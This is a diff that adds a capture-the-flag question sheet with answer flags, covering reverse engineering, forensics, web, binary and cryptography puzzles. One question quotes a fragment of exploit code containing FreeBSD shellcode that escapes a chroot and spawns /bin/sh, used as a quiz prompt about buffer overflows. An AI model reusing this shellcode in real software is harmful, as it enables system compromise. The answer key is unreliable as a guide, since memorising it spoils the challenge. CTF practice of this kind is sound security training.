@@ -1,0 +1,131 @@
+Round1:
+
+reverse engineering: 
+1.) you know what reverse engineering is?
+enter the flag without spaces.
+Use proxy if needed: https://www.proxysite.com/
+find q4.class in source folder
+
+answer: 4l13n5w1llrul3
+
+MISC:
+1.) While examining a log report you find out that an intrusion has been attempted by a machine whose IP address is displayed as 0xde.0xad.0xbe.0xef. It looks to you like a hexadecimal number. You perform a ping 0xde.0xad.0xbe.0xef. Give the ip address from which he got the response.
+
+answer: 222.173.190.239
+
+
+2.) What is the proper response for a FIN scan if the port is closed?
+
+answer: RST
+
+3.) What is the domain ip which is being used for vce.ac.in?
+
+4.) 	#define MAKE_STR_FROM_RET(x) ((x)&0xff), (((x)&0xff00)8),
+	(((x)&0xff0000)16), (((x)&0xff000000)24)
+	char infin_loop[]=
+	/ for examing purposes /
+	"\xEB\xFE";
+	char bsdcode[] =
+	/ Lam3rZ chroot() code rewritten for FreeBSD by venglin /
+	"\x31\xc0\x50\x50\x50\xb0\x7e\xcd\x80\x31\xdb\x31\xc0\x43"
+	"\x43\x53\x4b\x53\x53\xb0\x5a\xcd\x80\xeb\x77\x5e\x31\xc0"
+	"\x8d\x5e\x01\x88\x46\x04\x66\x68\xff\xff\x01\x53\x53\xb0"
+	"\x88\xcd\x80\x31\xc0\x8d\x5e\x01\x53\x53\xb0\x3d\xcd\x80"
+	"\x31\xc0\x31\xdb\x8d\x5e\x08\x89\x43\x02\x31\xc9\xfe\xc9"
+	"\x31\xc0\x8d\x5e\x08\x53\x53\xb0\x0c\xcd\x80\xfe\xc9\x75"
+	"\xf1\x31\xc0\x88\x46\x09\x8d\x5e\x08\x53\x53\xb0\x3d\xcd"
+	"\x80\xfe\x0e\xb0\x30\xfe\xc8\x88\x46\x04\x31\xc0\x88\x46"
+	"\x07\x89\x76\x08\x89\x46\x0c\x89\xf3\x8d\x4e\x08\x8d\x56"
+	"\x0c\x52\x51\x53\x53\xb0\x3b\xcd\x80\x31\xc0\x31\xdb\x53"
+	"\x53\xb0\x01\xcd\x80\xe8\x84\xff\xff\xff\xff\x01\xff\xff\x30"
+	"\x62\x69\x6e\x30\x73\x68\x31\x2e\x2e\x31\x31\x76\x65\x6e"
+	"\x67\x6c\x69\x6e";static int magic[MAX_MAGIC],magic_d[MAX_MAGIC];
+	static char magic_str=NULL;
+	int before_len=0;
+	char target=NULL, username="user", password=NULL;
+	struct targets getit;
+
+	The exploit code above is extracted from what kind of attack?
+
+answer: bufferoverflow
+
+5.) v=s7uuWqbzWkY
+    when info is less you know what to do
+
+Forensics:
+
+1.) Find the flag in mask.png(found in source folder)
+    answer: 5t3g0ch41 
+
+2.) Find the flag in file1.txt(found in source folder)
+    answer: paintrules
+
+BInary exploitation:
+
+1.) find the INTEGER password by executing which in turn is the flag.
+    Integer value can be positive or negative. 
+    The file is pass0(1) (found in source folder)
+
+Web exploitation:
+
+1.) http://pavansai57.000webhostapp.com/source.html
+    you know what to do.
+    Use the following proxy to open the website:
+    https://www.proxysite.com/
+    answer: 68656c6c6f2075736572
+
+2.) http://pavansai57db.000webhostapp.com/a/2/index.html
+
+    what do you do when you don't find a file in your computer?
+
+    Use the proxy site:
+    https://www.proxysite.com/
+
+    answer is in /b/3 : 38925283957
+
+3.) http://pavansai57.000webhostapp.com/abc.html
+
+    Use the proxy site: https://www.proxysite.com/
+    answer:
+    
+
+Cryptoraphy:
+
+1.) Get the flag:
+
+    011001100110110001100001011
+    00111011010
+    01011100110110000101101
+    1100110111
+    1011011100111100101101101011011110
+    111010101110011
+
+    for answer convert binary to ascii text.
+2.) look at your key board.
+
+    &) &^ ^% &! &# # ^ ^% @ &% ^% @ && *(
+
+    Note: There are spaces between every two symbols. Flag is an upper case string.
+
+    for answer convert hex of ascii on your keyboard to text.
+
+3.) Julius was a Roman politician. He will help you.
+
+    XDSYAKZWDDGXGDCK
+	
+    convert given text using reverse of caeser cipher.
+4.) '+' stands for element's second letter
+    '-' stands for element's first letter
+    Enter the answer in lower case letters.
+
+    22-|90+|10+||46-|18-|38-|51-|74|42+|86-|48+||53|99+||59-|68-|75-|3+|67+|48+|77-|
+    26+|95+
+
+    for answer look at periodic table and use their names.
+
+5.) even a small child can do this without any knowledge. The answer is in the question. And the question is given below:
+
+    lengepagforthechalthisisatracolumnsnsecipherthenispositiopassword
+
+    for answer re-arrangee the words in the string.
+
